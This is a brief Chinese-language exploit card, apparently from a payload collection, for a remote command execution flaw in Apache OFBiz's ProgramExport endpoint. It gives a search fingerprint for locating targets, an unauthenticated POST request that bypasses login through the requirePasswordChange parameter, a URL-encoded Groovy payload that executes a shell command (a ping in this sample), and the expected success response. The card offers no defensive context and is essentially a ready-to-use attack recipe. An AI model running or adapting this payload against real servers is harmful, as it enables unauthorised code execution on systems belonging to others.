# ApacheOFBizProgramExportRCE

ApacheOFBizProgramExport ｜ 命令执行 ｜ —
- **指纹**：`"Organizational Unit: Apache OFBiz"`
- **请求**：`POST /webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1`

**Payload**
```
groovyProgram=import+groovy.lang.GroovyShell%0D%0A%0D%0AGroovyShell+shell+%3D+new+GroovyShell%28%29%3B%0D%0Ashell.evaluate%28%27%22ping www.baidu.com%22.execute%28%29%27%29
```
- **响应特征**：200